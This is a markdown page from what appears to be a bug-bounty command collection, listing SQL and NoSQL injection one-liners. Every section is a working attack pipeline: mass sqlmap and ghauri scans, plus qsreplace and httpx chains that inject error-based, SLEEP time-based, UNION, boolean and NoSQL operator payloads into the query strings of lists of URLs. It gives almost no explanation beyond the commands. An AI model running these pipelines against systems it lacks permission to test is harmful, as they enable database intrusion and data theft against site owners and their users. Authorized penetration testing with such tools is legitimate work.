[← Back to README](../Readme.md)

---

## 🗄️ SQL Injection

### SQLMap Mass Scan
```bash
cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
```

### Error-Based Detection
```bash
cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle" | anew sqli_errors.txt
```

### Time-Based Blind
```bash
cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time_based.txt
```

### Ghauri Scan
```bash
cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3
```

### UNION Detection
```bash
cat urls.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200
```

### Boolean-Based Detection
```bash
cat urls.txt | gf sqli | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 | anew boolean_sqli.txt
```

### NoSQL Injection
```bash
cat urls.txt | qsreplace '{"$gt":""}' | httpx -silent -mc 200 | anew nosqli.txt
cat urls.txt | qsreplace "admin'||'1'=='1" | httpx -silent | anew nosqli.txt
```

---

[← Back to README](../Readme.md)
